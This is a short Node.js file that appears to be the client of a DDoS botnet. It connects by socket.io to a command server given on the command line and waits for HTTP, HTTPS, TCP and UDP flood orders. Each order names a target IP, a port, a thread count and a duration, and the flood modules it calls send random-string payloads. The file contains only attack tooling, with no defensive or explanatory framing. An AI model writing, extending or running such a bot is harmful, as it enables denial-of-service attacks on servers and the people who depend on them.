const socket = require("socket.io-client").io(process.argv[2]);

const methods = {
  http: require("./methods/http"),
  udp: require("./methods/udp"),
  tcp: require("./methods/tcp"),
};
function generateRandomString(length) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

socket.on("http", (data) => {
  let payload = data.pload;
  if (data.ptype === "flood") {
    payload = generateRandomString(parseInt(data.pload));
  }
  methods.http(
    "http://" + data.ip + ":" + data.port,
    payload,
    data.threads,
    data.duration
  );
});
socket.on("https", (data) => {
  let payload = data.pload;
  if (data.ptype === "flood") {
    payload = generateRandomString(parseInt(data.pload));
  }
  methods.http(
    "https://" + data.ip + ":" + data.port,
    payload,
    data.threads,
    data.duration
  );
});

socket.on("tcp", (data) => {
  let payload = data.pload;
  if (data.ptype === "flood") {
    payload = generateRandomString(parseInt(data.pload));
  }
  methods.tcp(data.ip, data.port, data.duration, data.threads, payload);
});
socket.on("udp", (data) => {
  let payload = data.pload;
  if (data.ptype === "flood") {
    payload = generateRandomString(parseInt(data.pload));
  }
  methods.udp(data.ip, data.port, data.duration, data.threads, payload);
});
